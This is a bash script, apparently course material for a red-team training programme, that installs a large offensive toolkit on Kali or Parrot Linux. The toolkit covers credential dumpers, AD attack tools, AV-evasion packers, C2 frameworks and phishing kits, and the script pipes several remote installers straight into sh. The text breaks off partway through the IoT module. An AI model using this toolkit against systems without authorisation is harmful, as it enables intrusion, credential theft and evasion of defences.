#!/usr/bin/env bash
# ============================================================================
# Red Team Academy — Attacker Machine Setup
# ============================================================================
# Comprehensive tool installation for Kali Linux and Parrot OS.
# Tested on: Kali 2025.x / 2026.x, Parrot 6.x
#
# Usage:
#   chmod +x rta-setup.sh
#   sudo ./rta-setup.sh --all            # Install everything
#   sudo ./rta-setup.sh --module recon    # Install one category
#   sudo ./rta-setup.sh --list           # List available modules
#   sudo ./rta-setup.sh --dry-run --all  # Preview without installing
#
# Modules: core, recon, ad, exploitation, post-exploitation, evasion,
#          c2, web, wireless, iot, pivoting, password, cloud, mobile,
#          network, ai, dev-tools, wordlists, custom-tools
# ============================================================================

set -euo pipefail
IFS=$'\n\t'

# ── Configuration ──────────────────────────────────────────────────────────
TOOLS_DIR="/opt/red-team"
WORDLIST_DIR="/opt/wordlists"
CUSTOM_TOOLS_DIR="/opt/red-team/custom"
GO_TOOLS_DIR="/opt/red-team/go-tools"
VENV_DIR="/opt/red-team/venvs"
LOG_FILE="/var/log/rta-setup.log"
SCRIPT_VERSION="2.0.0"
DRY_RUN=false
INSTALL_MODULES=()
FAILED_TOOLS=()
SKIPPED_TOOLS=()
INSTALLED_TOOLS=()
DISTRO=""
DISTRO_VERSION=""
REAL_USER="${SUDO_USER:-$(whoami)}"
REAL_HOME=$(eval echo "~${REAL_USER}")

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ── Utility Functions ──────────────────────────────────────────────────────

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ____           __   ______                         ___                __
   / __ \___  ____/ /  /_  __/__  ____ _____ ___      /   | _________ __/ /__  ____ ___  __  __
  / /_/ / _ \/ __  /    / / / _ \/ __ `/ __ `__ \    / /| |/ ___/ __ `/ __  / _ \/ __ `__ \/ / / /
 / _, _/  __/ /_/ /    / / /  __/ /_/ / / / / / /   / ___ / /__/ /_/ / /_/ /  __/ / / / / / /_/ /
/_/ |_|\___/\__,_/    /_/  \___/\__,_/_/ /_/ /_/   /_/  |_\___/\__,_/\__,_/\___/_/ /_/ /_/\__, /
                                                                                          /____/
EOF
    echo -e "${NC}"
    echo -e "${BOLD}  Attacker Machine Setup v${SCRIPT_VERSION}${NC}"
    echo -e "  ─────────────────────────────────────────────"
    echo ""
}

log() {
    local level="$1"; shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${msg}" >> "${LOG_FILE}" 2>/dev/null || true
    case "${level}" in
        INFO)  echo -e "  ${GREEN}[+]${NC} ${msg}" ;;
        WARN)  echo -e "  ${YELLOW}[!]${NC} ${msg}" ;;
        ERROR) echo -e "  ${RED}[-]${NC} ${msg}" ;;
        TASK)  echo -e "  ${CYAN}[>]${NC} ${msg}" ;;
        SKIP)  echo -e "  ${BLUE}[~]${NC} ${msg}" ;;
    esac
}

section() {
    echo ""
    echo -e "  ${BOLD}${RED}═══${NC} ${BOLD}$1${NC} ${BOLD}${RED}═══${NC}"
    echo ""
}

cmd() {
    if [ "${DRY_RUN}" = true ]; then
        log TASK "[DRY RUN] $*"
        return 0
    fi
    "$@" >> "${LOG_FILE}" 2>&1
}

# Install a tool via git clone if not already present
git_install() {
    local repo_url="$1"
    local dest="$2"
    local name
    name=$(basename "${dest}")

    if [ -d "${dest}" ]; then
        log SKIP "${name} already cloned"
        SKIPPED_TOOLS+=("${name}")
        return 0
    fi

    log TASK "Cloning ${name}..."
    if cmd git clone --depth 1 "${repo_url}" "${dest}"; then
        log INFO "${name} cloned successfully"
        INSTALLED_TOOLS+=("${name}")
    else
        log ERROR "Failed to clone ${name}"
        FAILED_TOOLS+=("${name}")
    fi
}

# Install a Go tool
go_install() {
    local pkg="$1"
    local name
    name=$(basename "${pkg}" | sed 's/@.*//')

    if command -v "${name}" &>/dev/null; then
        log SKIP "${name} already installed"
        SKIPPED_TOOLS+=("${name}")
        return 0
    fi

    log TASK "Installing Go tool: ${name}..."
    if cmd env GOPATH="${GO_TOOLS_DIR}" GOBIN="/usr/local/bin" \
        go install "${pkg}"; then
        log INFO "${name} installed"
        INSTALLED_TOOLS+=("${name}")
    else
        log ERROR "Failed to install ${name}"
        FAILED_TOOLS+=("${name}")
    fi
}

# Install a pip package in a named venv
pip_venv_install() {
    local venv_name="$1"; shift
    local packages=("$@")
    local venv_path="${VENV_DIR}/${venv_name}"

    if [ ! -d "${venv_path}" ]; then
        log TASK "Creating venv: ${venv_name}..."
        cmd python3 -m venv "${venv_path}"
    fi

    for pkg in "${packages[@]}"; do
        local pkg_name
        pkg_name=$(echo "${pkg}" | sed 's/[<>=!].*//' | sed 's/\[.*//')
        log TASK "Installing ${pkg_name} in venv ${venv_name}..."
        if cmd "${venv_path}/bin/pip" install --upgrade "${pkg}"; then
            log INFO "${pkg_name} installed in ${venv_name}"
            INSTALLED_TOOLS+=("${pkg_name}")
        else
            log ERROR "Failed to install ${pkg_name}"
            FAILED_TOOLS+=("${pkg_name}")
        fi
    done

    # Symlink key binaries to /usr/local/bin
    if [ -d "${venv_path}/bin" ]; then
        for bin in "${venv_path}/bin/"*; do
            local bin_name
            bin_name=$(basename "${bin}")
            # Skip generic python/pip/activate scripts
            case "${bin_name}" in
                python*|pip*|activate*|Activate*|easy_install*|wheel*|setuptools*) continue ;;
            esac
            if [ -x "${bin}" ] && [ ! -e "/usr/local/bin/${bin_name}" ]; then
                ln -sf "${bin}" "/usr/local/bin/${bin_name}" 2>/dev/null || true
            fi
        done
    fi
}

# Install a pipx package globally
pipx_install() {
    local pkg="$1"
    local pkg_name
    pkg_name=$(echo "${pkg}" | sed 's/[<>=!].*//' | sed 's/\[.*//')

    if sudo -u "${REAL_USER}" pipx list 2>/dev/null | grep -q "${pkg_name}"; then
        log SKIP "${pkg_name} already installed via pipx"
        SKIPPED_TOOLS+=("${pkg_name}")
        return 0
    fi

    log TASK "Installing ${pkg_name} via pipx..."
    if cmd sudo -u "${REAL_USER}" PIPX_HOME="${REAL_HOME}/.local/pipx" \
        PIPX_BIN_DIR="${REAL_HOME}/.local/bin" pipx install "${pkg}"; then
        # Symlink to /usr/local/bin for root access
        local bin_path="${REAL_HOME}/.local/bin/${pkg_name}"
        if [ -x "${bin_path}" ] && [ ! -e "/usr/local/bin/${pkg_name}" ]; then
            ln -sf "${bin_path}" "/usr/local/bin/${pkg_name}" 2>/dev/null || true
        fi
        log INFO "${pkg_name} installed via pipx"
        INSTALLED_TOOLS+=("${pkg_name}")
    else
        log ERROR "Failed to install ${pkg_name} via pipx"
        FAILED_TOOLS+=("${pkg_name}")
    fi
}

# Install cargo package
cargo_install() {
    local pkg="$1"

    if command -v "${pkg}" &>/dev/null; then
        log SKIP "${pkg} already installed"
        SKIPPED_TOOLS+=("${pkg}")
        return 0
    fi

    log TASK "Installing Rust tool: ${pkg}..."
    if cmd cargo install "${pkg}"; then
        log INFO "${pkg} installed via cargo"
        INSTALLED_TOOLS+=("${pkg}")
    else
        log ERROR "Failed to install ${pkg}"
        FAILED_TOOLS+=("${pkg}")
    fi
}

# Install gem package
gem_install() {
    local pkg="$1"

    if gem list -i "${pkg}" &>/dev/null; then
        log SKIP "${pkg} already installed"
        SKIPPED_TOOLS+=("${pkg}")
        return 0
    fi

    log TASK "Installing Ruby gem: ${pkg}..."
    if cmd gem install "${pkg}"; then
        log INFO "${pkg} installed via gem"
        INSTALLED_TOOLS+=("${pkg}")
    else
        log ERROR "Failed to install ${pkg}"
        FAILED_TOOLS+=("${pkg}")
    fi
}

# Install apt packages (batch)
apt_install() {
    local packages=("$@")
    local to_install=()

    for pkg in "${packages[@]}"; do
        if dpkg -l "${pkg}" 2>/dev/null | grep -q "^ii"; then
            SKIPPED_TOOLS+=("${pkg}")
        else
            to_install+=("${pkg}")
        fi
    done

    if [ ${#to_install[@]} -eq 0 ]; then
        log SKIP "All apt packages already installed"
        return 0
    fi

    log TASK "Installing ${#to_install[@]} apt packages..."
    if [ "${DRY_RUN}" = true ]; then
        log TASK "[DRY RUN] apt install ${to_install[*]}"
        return 0
    fi

    if DEBIAN_FRONTEND=noninteractive apt-get install -y "${to_install[@]}" \
        >> "${LOG_FILE}" 2>&1; then
        for pkg in "${to_install[@]}"; do
            INSTALLED_TOOLS+=("${pkg}")
        done
        log INFO "Installed: ${to_install[*]}"
    else
        # Try one at a time to identify failures
        for pkg in "${to_install[@]}"; do
            if DEBIAN_FRONTEND=noninteractive apt-get install -y "${pkg}" \
                >> "${LOG_FILE}" 2>&1; then
                INSTALLED_TOOLS+=("${pkg}")
            else
                log ERROR "Failed to install apt package: ${pkg}"
                FAILED_TOOLS+=("${pkg}")
            fi
        done
    fi
}

# ── Pre-flight Checks ─────────────────────────────────────────────────────

preflight() {
    section "Pre-flight Checks"

    # Must be root
    if [ "$(id -u)" -ne 0 ]; then
        log ERROR "This script must be run as root (use sudo)"
        exit 1
    fi

    # Detect distro
    if [ -f /etc/os-release ]; then
        # shellcheck source=/dev/null
        source /etc/os-release
        DISTRO="${ID}"
        DISTRO_VERSION="${VERSION_ID:-unknown}"
    fi

    case "${DISTRO}" in
        kali)
            log INFO "Detected Kali Linux ${DISTRO_VERSION}"
            ;;
        parrot)
            log INFO "Detected Parrot OS ${DISTRO_VERSION}"
            ;;
        *)
            log WARN "Unsupported distro: ${DISTRO}. Script designed for Kali/Parrot."
            log WARN "Continuing anyway — some packages may not be available."
            ;;
    esac

    # Check internet
    if ! ping -c 1 -W 3 1.1.1.1 &>/dev/null; then
        log ERROR "No internet connectivity. Cannot proceed."
        exit 1
    fi
    log INFO "Internet connectivity confirmed"

    # Create directory structure
    for dir in "${TOOLS_DIR}" "${WORDLIST_DIR}" "${CUSTOM_TOOLS_DIR}" \
               "${GO_TOOLS_DIR}" "${VENV_DIR}"; do
        mkdir -p "${dir}"
    done
    log INFO "Directory structure created under ${TOOLS_DIR}"

    # Init log
    mkdir -p "$(dirname "${LOG_FILE}")"
    echo "=== RTA Setup Log — $(date) ===" >> "${LOG_FILE}"
}

# ── Module: Core System ───────────────────────────────────────────────────

install_core() {
    section "Core System & Dependencies"

    # System update
    log TASK "Updating package lists..."
    cmd apt-get update

    # Core system packages
    apt_install \
        git curl wget jq tmux screen tree htop unzip p7zip-full \
        build-essential gcc g++ make cmake \
        python3 python3-pip python3-venv python3-dev \
        pipx \
        libssl-dev libffi-dev libpcap-dev libxml2-dev libxslt1-dev \
        zlib1g-dev libjpeg-dev libpq-dev \
        apt-transport-https ca-certificates gnupg2 software-properties-common \
        net-tools dnsutils whois traceroute \
        tcpdump tshark wireshark-common \
        proxychains4 socat netcat-openbsd \
        openssh-client openssh-server \
        smbclient smbmap \
        postgresql-client \
        libreoffice-calc \
        xclip xsel

    # Docker (if not present)
    if ! command -v docker &>/dev/null; then
        log TASK "Installing Docker..."
        if [ "${DRY_RUN}" = false ]; then
            curl -fsSL https://get.docker.com | sh >> "${LOG_FILE}" 2>&1 || \
                log WARN "Docker install failed — try manually"
            usermod -aG docker "${REAL_USER}" 2>/dev/null || true
        fi
    else
        log SKIP "Docker already installed"
    fi

    # Docker Compose
    if ! command -v docker-compose &>/dev/null && ! docker compose version &>/dev/null 2>&1; then
        apt_install docker-compose-plugin
    else
        log SKIP "Docker Compose already available"
    fi

    # Go
    if ! command -v go &>/dev/null; then
        log TASK "Installing Go..."
        if [ "${DRY_RUN}" = false ]; then
            local go_version
            go_version=$(curl -sL 'https://go.dev/VERSION?m=text' | head -1)
            curl -sLo /tmp/go.tar.gz "https://go.dev/dl/${go_version}.linux-amd64.tar.gz"
            rm -rf /usr/local/go
            tar -C /usr/local -xzf /tmp/go.tar.gz
            rm -f /tmp/go.tar.gz
            # Set up Go paths
            cat > /etc/profile.d/go-path.sh << 'GOEOF'
export PATH=$PATH:/usr/local/go/bin
export GOPATH=/opt/red-team/go-tools
export GOBIN=/usr/local/bin
GOEOF
            export PATH=$PATH:/usr/local/go/bin
            export GOPATH="${GO_TOOLS_DIR}"
            export GOBIN=/usr/local/bin
            log INFO "Go ${go_version} installed"
        fi
    else
        export GOPATH="${GO_TOOLS_DIR}"
        export GOBIN=/usr/local/bin
        log SKIP "Go $(go version | awk '{print $3}') already installed"
    fi

    # Rust / Cargo
    if ! command -v cargo &>/dev/null; then
        log TASK "Installing Rust toolchain..."
        if [ "${DRY_RUN}" = false ]; then
            sudo -u "${REAL_USER}" bash -c \
                'curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y' \
                >> "${LOG_FILE}" 2>&1 || log WARN "Rust install failed"
            export PATH="${REAL_HOME}/.cargo/bin:${PATH}"
            # Make cargo available system-wide
            ln -sf "${REAL_HOME}/.cargo/bin/cargo" /usr/local/bin/cargo 2>/dev/null || true
            ln -sf "${REAL_HOME}/.cargo/bin/rustc" /usr/local/bin/rustc 2>/dev/null || true
        fi
    else
        log SKIP "Rust $(cargo --version | awk '{print $2}') already installed"
    fi

    # Ruby + Gem
    if ! command -v ruby &>/dev/null; then
        apt_install ruby ruby-dev
    else
        log SKIP "Ruby $(ruby --version | awk '{print $2}') already installed"
    fi

    # MinGW cross-compiler (Windows payloads from Linux)
    apt_install mingw-w64 mingw-w64-tools

    # NASM (shellcoding)
    apt_install nasm

    # .NET SDK (for compiling C# offensive tools)
    if ! command -v dotnet &>/dev/null; then
        apt_install dotnet-sdk-8.0 || log WARN "dotnet-sdk-8.0 not available — install manually"
    fi

    # Ensure pipx path is in PATH
    sudo -u "${REAL_USER}" pipx ensurepath >> "${LOG_FILE}" 2>&1 || true

    log INFO "Core system setup complete"
}

# ── Module: Reconnaissance ────────────────────────────────────────────────

install_recon() {
    section "Reconnaissance Tools"

    # APT packages
    apt_install \
        nmap masscan nikto whois dnsutils dnsenum \
        fierce recon-ng theharvester wafw00f \
        whatweb wapiti dirb dirbuster

    # Go tools
    go_install "github.com/owasp-amass/amass/v4/...@master"
    go_install "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    go_install "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    go_install "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    go_install "github.com/projectdiscovery/katana/cmd/katana@latest"
    go_install "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    go_install "github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
    go_install "github.com/projectdiscovery/uncover/cmd/uncover@latest"
    go_install "github.com/ffuf/ffuf/v2@latest"
    go_install "github.com/tomnomnom/assetfinder@latest"
    go_install "github.com/tomnomnom/waybackurls@latest"
    go_install "github.com/tomnomnom/httprobe@latest"
    go_install "github.com/tomnomnom/meg@latest"
    go_install "github.com/tomnomnom/qsreplace@latest"
    go_install "github.com/tomnomnom/anew@latest"
    go_install "github.com/tomnomnom/gf@latest"
    go_install "github.com/tomnomnom/unfurl@latest"
    go_install "github.com/lc/gau/v2/cmd/gau@latest"
    go_install "github.com/hakluke/hakrawler@latest"
    go_install "github.com/jaeles-project/gospider@latest"
    go_install "github.com/d3mondev/puredns/v2@latest"
    go_install "github.com/glebarez/cero@latest"

    # Cargo tools
    cargo_install feroxbuster
    cargo_install rustscan

    # Pip tools
    pip_venv_install "recon" \
        shodan censys dnspython

    pipx_install "bbot"

    # Git repos
    git_install "https://github.com/laramies/theHarvester" \
        "${TOOLS_DIR}/theHarvester"
    git_install "https://github.com/six2dez/reconftw" \
        "${TOOLS_DIR}/reconftw"
    git_install "https://github.com/GerbenJavado/LinkFinder" \
        "${TOOLS_DIR}/LinkFinder"
    git_install "https://github.com/fkasler/ghost_scout" \
        "${TOOLS_DIR}/ghost_scout"
    git_install "https://github.com/blacklanternsecurity/TREVORproxy" \
        "${TOOLS_DIR}/TREVORproxy"

    # TREVORspray
    pipx_install "trevorspray"

    # DNSChef
    git_install "https://github.com/iphelix/dnschef" \
        "${TOOLS_DIR}/dnschef"

    # Nettacker (Docker preferred)
    if command -v docker &>/dev/null; then
        log TASK "Pulling OWASP Nettacker Docker image..."
        cmd docker pull owasp/nettacker:latest || log WARN "Nettacker pull failed"
    fi

    # Nuclei templates
    if command -v nuclei &>/dev/null && [ "${DRY_RUN}" = false ]; then
        log TASK "Updating Nuclei templates..."
        sudo -u "${REAL_USER}" nuclei -ut >> "${LOG_FILE}" 2>&1 || true
    fi

    # gf patterns
    if command -v gf &>/dev/null; then
        local gf_dir="${REAL_HOME}/.gf"
        if [ ! -d "${gf_dir}" ]; then
            git_install "https://github.com/1ndianl33t/Gf-Patterns" "/tmp/gf-patterns"
            mkdir -p "${gf_dir}"
            cp /tmp/gf-patterns/*.json "${gf_dir}/" 2>/dev/null || true
            chown -R "${REAL_USER}:${REAL_USER}" "${gf_dir}"
            rm -rf /tmp/gf-patterns
        fi
    fi

    log INFO "Reconnaissance tools installed"
}

# ── Module: Active Directory ──────────────────────────────────────────────

install_ad() {
    section "Active Directory & Windows Attack Tools"

    # APT packages
    apt_install \
        smbclient smbmap enum4linux-ng \
        ldap-utils krb5-user krb5-config \
        bloodhound neo4j \
        powershell \
        freerdp2-x11 rdesktop

    # Impacket (the core AD toolkit)
    pipx_install "impacket"

    # NetExec (successor to CrackMapExec)
    pipx_install "netexec"

    # Certipy (ADCS attacks)
    pipx_install "certipy-ad"

    # Coercer (multi-method coercion)
    pipx_install "coercer"

    # Go tools
    go_install "github.com/ropnop/kerbrute@latest"

    # Ruby tools
    gem_install evil-winrm

    # Git repos — AD attack tools
    git_install "https://github.com/fortra/impacket" \
        "${TOOLS_DIR}/impacket-source"
    git_install "https://github.com/lgandx/Responder" \
        "${TOOLS_DIR}/Responder"
    git_install "https://github.com/topotam/PetitPotam" \
        "${TOOLS_DIR}/PetitPotam"
    git_install "https://github.com/Flangvik/SharpCollection" \
        "${TOOLS_DIR}/SharpCollection"
    git_install "https://github.com/samratashok/nishang" \
        "${TOOLS_DIR}/nishang"
    git_install "https://github.com/PowerShellMafia/PowerSploit" \
        "${TOOLS_DIR}/PowerSploit"
    git_install "https://github.com/AlessandroZ/LaZagne" \
        "${TOOLS_DIR}/LaZagne"
    git_install "https://github.com/titanis-project/titanis" \
        "${TOOLS_DIR}/titanis"
    git_install "https://github.com/sinacr/winproto" \
        "${TOOLS_DIR}/winproto"
    git_install "https://github.com/login-securite/DonPAPI" \
        "${TOOLS_DIR}/DonPAPI"
    git_install "https://github.com/skelsec/pypykatz" \
        "${TOOLS_DIR}/pypykatz-source"
    git_install "https://github.com/dirkjanm/mitm6" \
        "${TOOLS_DIR}/mitm6"
    git_install "https://github.com/fox-it/BloodHound.py" \
        "${TOOLS_DIR}/BloodHound.py"
    git_install "https://github.com/CravateRouge/bloodyAD" \
        "${TOOLS_DIR}/bloodyAD"
    git_install "https://github.com/franc-pentest/ldeep" \
        "${TOOLS_DIR}/ldeep"

    # pypykatz and mitm6 via pip
    pipx_install "pypykatz"
    pipx_install "mitm6"
    pipx_install "bloodyAD"
    pipx_install "ldeep"

    # BloodHound CE (Docker)
    if command -v docker &>/dev/null; then
        log TASK "BloodHound CE available via: curl -L https://ghst.ly/getbhce | docker compose -f - up"
        log INFO "Run BloodHound CE manually when needed (resource-heavy)"
    fi

    log INFO "Active Directory tools installed"
}

# ── Module: Exploitation ──────────────────────────────────────────────────

install_exploitation() {
    section "Exploitation Tools"

    # APT packages
    apt_install \
        metasploit-framework sqlmap \
        exploitdb searchsploit \
        gdb gdb-multiarch \
        radare2 binwalk foremost \
        ghidra

    # Python exploitation libraries
    pip_venv_install "exploitation" \
        pwntools ropper \
        requests beautifulsoup4 lxml \
        paramiko pycryptodome scapy

    # Git repos
    git_install "https://github.com/swisskyrepo/PayloadsAllTheThings" \
        "${TOOLS_DIR}/PayloadsAllTheThings"
    git_install "https://github.com/redcanaryco/atomic-red-team" \
        "${TOOLS_DIR}/atomic-red-team"
    git_install "https://github.com/mitre-attack/attack-navigator" \
        "${TOOLS_DIR}/attack-navigator"
    git_install "https://github.com/dirtycow/dirtycow.github.io" \
        "${TOOLS_DIR}/dirtycow"
    git_install "https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" \
        "${TOOLS_DIR}/HackSysExtremeVulnerableDriver"

    # Nuclei (if not already from recon)
    if ! command -v nuclei &>/dev/null; then
        go_install "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    fi

    log INFO "Exploitation tools installed"
}

# ── Module: Post-Exploitation ─────────────────────────────────────────────

install_post_exploitation() {
    section "Post-Exploitation Tools"

    # APT packages — privesc & lateral movement
    apt_install \
        pspy \
        wine wine64

    # PEASS-ng (LinPEAS / WinPEAS)
    local peass_dir="${TOOLS_DIR}/PEASS-ng"
    if [ ! -d "${peass_dir}" ]; then
        git_install "https://github.com/peass-ng/PEASS-ng" "${peass_dir}"
    fi

    # Pre-download release binaries
    local peass_bin="${TOOLS_DIR}/peass-binaries"
    if [ ! -d "${peass_bin}" ] && [ "${DRY_RUN}" = false ]; then
        mkdir -p "${peass_bin}"
        log TASK "Downloading LinPEAS and WinPEAS release binaries..."
        curl -sLo "${peass_bin}/linpeas.sh" \
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" || true
        curl -sLo "${peass_bin}/winPEASx64.exe" \
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" || true
        curl -sLo "${peass_bin}/winPEASx86.exe" \
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" || true
        chmod +x "${peass_bin}/linpeas.sh"
        log INFO "PEASS binaries downloaded to ${peass_bin}"
    fi

    # Linux privesc tools
    git_install "https://github.com/diego-treitos/linux-smart-enumeration" \
        "${TOOLS_DIR}/linux-smart-enumeration"
    git_install "https://github.com/rebootuser/LinEnum" \
        "${TOOLS_DIR}/LinEnum"
    git_install "https://github.com/The-Z-Labs/linux-exploit-suggester" \
        "${TOOLS_DIR}/linux-exploit-suggester"

    # Windows privesc
    git_install "https://github.com/itm4n/PrintSpoofer" \
        "${TOOLS_DIR}/PrintSpoofer"
    git_install "https://github.com/BeichenDream/GodPotato" \
        "${TOOLS_DIR}/GodPotato"
    git_install "https://github.com/GhostPack/Seatbelt" \
        "${TOOLS_DIR}/Seatbelt"

    # Data exfiltration
    git_install "https://github.com/FortyNorthSecurity/Egress-Assess" \
        "${TOOLS_DIR}/Egress-Assess"

    log INFO "Post-exploitation tools installed"
}

# ── Module: Evasion ───────────────────────────────────────────────────────

install_evasion() {
    section "Evasion & Obfuscation Tools"

    # APT packages
    apt_install \
        shellter upx-ucl

    # Go evasion tools
    go_install "mvdan.cc/garble@latest"

    # ScareCrow
    if [ ! -d "${TOOLS_DIR}/ScareCrow" ]; then
        git_install "https://github.com/Tylous/ScareCrow" "${TOOLS_DIR}/ScareCrow"
        if [ -d "${TOOLS_DIR}/ScareCrow" ] && [ "${DRY_RUN}" = false ]; then
            (cd "${TOOLS_DIR}/ScareCrow" && go build ScareCrow.go >> "${LOG_FILE}" 2>&1) || \
                log WARN "ScareCrow build failed — check Go dependencies"
        fi
    fi

    # Freeze
    if [ ! -d "${TOOLS_DIR}/Freeze" ]; then
        git_install "https://github.com/optiv/Freeze" "${TOOLS_DIR}/Freeze"
        if [ -d "${TOOLS_DIR}/Freeze" ] && [ "${DRY_RUN}" = false ]; then
            (cd "${TOOLS_DIR}/Freeze" && go build Freeze.go >> "${LOG_FILE}" 2>&1) || \
                log WARN "Freeze build failed"
        fi
    fi

    # Donut (shellcode generator)
    go_install "github.com/Binject/go-donut/cmd/donut@latest"

    # Git repos
    git_install "https://github.com/phra/PEzor" \
        "${TOOLS_DIR}/PEzor"
    git_install "https://github.com/monoxgas/sRDI" \
        "${TOOLS_DIR}/sRDI"
    git_install "https://github.com/govolution/avet" \
        "${TOOLS_DIR}/avet"
    git_install "https://github.com/mkaring/ConfuserEx" \
        "${TOOLS_DIR}/ConfuserEx"
    git_install "https://github.com/danielbohannon/Invoke-Obfuscation" \
        "${TOOLS_DIR}/Invoke-Obfuscation"
    git_install "https://github.com/CBHue/PyFuscation" \
        "${TOOLS_DIR}/PyFuscation"
    git_install "https://github.com/sadreck/Codecepticon" \
        "${TOOLS_DIR}/Codecepticon"
    git_install "https://github.com/FreddyRodgers/emojichef" \
        "${TOOLS_DIR}/emojichef"
    git_install "https://github.com/CyberSecurityUP/hookchain-shellcode-loader" \
        "${TOOLS_DIR}/hookchain"
    git_install "https://github.com/klezVirus/inern4l-sh3ll" \
        "${TOOLS_DIR}/inern4l-sh3ll"

    # Veil framework
    if [ ! -d "${TOOLS_DIR}/Veil" ]; then
        git_install "https://github.com/Veil-Framework/Veil" "${TOOLS_DIR}/Veil"
    fi

    log INFO "Evasion tools installed"
}

# ── Module: C2 Frameworks ────────────────────────────────────────────────

install_c2() {
    section "C2 Frameworks & Payload Delivery"

    # Metasploit (usually pre-installed on Kali/Parrot)
    if ! command -v msfconsole &>/dev/null; then
        apt_install metasploit-framework
    else
        log SKIP "Metasploit already installed"
    fi

    # Sliver C2
    if [ ! -f /usr/local/bin/sliver-server ]; then
        log TASK "Installing Sliver C2..."
        if [ "${DRY_RUN}" = false ]; then
            curl -sLo /tmp/sliver-install.sh https://sliver.sh/install && \
                chmod +x /tmp/sliver-install.sh && \
                /tmp/sliver-install.sh >> "${LOG_FILE}" 2>&1 && \
                rm -f /tmp/sliver-install.sh || \
                log WARN "Sliver install failed — try: curl https://sliver.sh/install | sudo bash"
        fi
    else
        log SKIP "Sliver already installed"
    fi

    # Havoc C2
    git_install "https://github.com/HavocFramework/Havoc" \
        "${TOOLS_DIR}/Havoc"

    # Mythic C2
    git_install "https://github.com/its-a-feature/Mythic" \
        "${TOOLS_DIR}/Mythic"

    # GoPhish
    git_install "https://github.com/gophish/gophish" \
        "${TOOLS_DIR}/gophish"

    # Evilginx
    git_install "https://github.com/kgretzky/evilginx2" \
        "${TOOLS_DIR}/evilginx2"

    # BaiaoC2
    git_install "https://github.com/CyberSecurityUP/baiaoc2" \
        "${TOOLS_DIR}/baiaoc2"

    # Malleable C2 Profiles
    git_install "https://github.com/BC-SECURITY/Malleable-C2-Profiles" \
        "${TOOLS_DIR}/Malleable-C2-Profiles"

    # C2 redirector tools
    git_install "https://github.com/mgeeky/RedWarden" \
        "${TOOLS_DIR}/RedWarden"

    log INFO "C2 frameworks installed"
}

# ── Module: Web Hacking ──────────────────────────────────────────────────

install_web() {
    section "Web Hacking Tools"

    # APT packages
    apt_install \
        sqlmap nikto wfuzz dirb gobuster \
        zaproxy

    # Go tools (many already in recon — these are web-specific)
    if ! command -v ffuf &>/dev/null; then
        go_install "github.com/ffuf/ffuf/v2@latest"
    fi

    # Cargo tools
    cargo_install x8

    # Python tools
    pip_venv_install "web" \
        h2spacex mitmproxy \
        jwt-tool \
        graphql-cop clairvoyance \
        wsrepl

    pipx_install "reset-tolkien"

    # Git repos
    git_install "https://github.com/swisskyrepo/SSRFmap" \
        "${TOOLS_DIR}/SSRFmap"
    git_install "https://github.com/swisskyrepo/GraphQLmap" \
        "${TOOLS_DIR}/GraphQLmap"
    git_install "https://github.com/epinna/tplmap" \
        "${TOOLS_DIR}/tplmap"
    git_install "https://github.com/defparam/smuggler" \
        "${TOOLS_DIR}/smuggler"
    git_install "https://github.com/assetnote/batchql" \
        "${TOOLS_DIR}/batchql"
    git_install "https://github.com/devploit/nomore403" \
        "${TOOLS_DIR}/nomore403"
    git_install "https://github.com/0xacb/recollapse" \
        "${TOOLS_DIR}/recollapse"
    git_install "https://github.com/fransr/postMessage-tracker" \
        "${TOOLS_DIR}/postMessage-tracker"
    git_install "https://github.com/RUB-NDS/CORStest" \
        "${TOOLS_DIR}/CORStest"
    git_install "https://github.com/ticarpi/jwt_tool" \
        "${TOOLS_DIR}/jwt_tool"
    git_install "https://github.com/trustedsec/social-engineer-toolkit" \
        "${TOOLS_DIR}/social-engineer-toolkit"
    git_install "https://github.com/J0hn5/ShadowPhish" \
        "${TOOLS_DIR}/ShadowPhish"
    git_install "https://github.com/race-the-web/race-the-web" \
        "${TOOLS_DIR}/race-the-web"
    git_install "https://github.com/s0md3v/Arjun" \
        "${TOOLS_DIR}/Arjun"
    git_install "https://github.com/commixproject/commix" \
        "${TOOLS_DIR}/commix"

    # Protobuf tools for gRPC testing
    pip_venv_install "grpc" \
        grpcio grpcio-tools protobuf-inspector blackboxprotobuf

    log INFO "Web hacking tools installed"
}

# ── Module: Wireless ─────────────────────────────────────────────────────

install_wireless() {
    section "Wireless Attack Tools"

    # APT packages
    apt_install \
        aircrack-ng hcxtools hcxdumptool \
        bettercap hostapd-wpe \
        kismet wifite reaver pixiewps bully mdk4 \
        macchanger iw wireless-tools wpasupplicant

    # EAPHammer
    git_install "https://github.com/s0lst1c3/eaphammer" \
        "${TOOLS_DIR}/eaphammer"

    # Proxmark3 client
    git_install "https://github.com/RfidResearchGroup/proxmark3" \
        "${TOOLS_DIR}/proxmark3"

    # Killerbee (ZigBee)
    git_install "https://github.com/riverloopsec/killerbee" \
        "${TOOLS_DIR}/killerbee"

    log INFO "Wireless attack tools installed"
}

# ── Module: IoT ──────────────────────────────────────────────────────────

install_iot() {
    section "IoT & Hardware Hacking Tools"

    # APT packages
    apt_install \
        binwalk firmware-mod-kit \
        flashrom minicom picocom openocd

    # Firmware analysis
    git_install "https://github.com/attify/firmware-analysis-toolkit" \
        "${TOOLS_DIR}/firmware-analysis-toolkit"
    git_install "https://github.com/craigz28/firmwalker" \
        "${TOOLS_DIR}/firmwalker"
    git_install "https://github.com/e-m-b-a/emba" \
        "${TOOLS_DIR}/emba"

    # RouterSploit
    git_install "https://github.com/threat9/routersploit" \
        "${TOOLS_DIR}/routersploit"
